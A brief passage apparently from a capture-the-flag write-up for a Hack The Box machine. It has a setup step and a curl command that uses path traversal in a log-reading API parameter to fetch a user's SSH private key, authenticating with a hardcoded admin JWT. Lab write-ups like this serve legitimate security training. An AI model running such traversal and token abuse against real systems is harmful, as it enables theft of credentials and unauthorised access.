To successfull set up the environment for testing the APIs you should add the subdomain` swagger-ui.instant.htb` to the `/etc/hosts` file. 

`curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"`
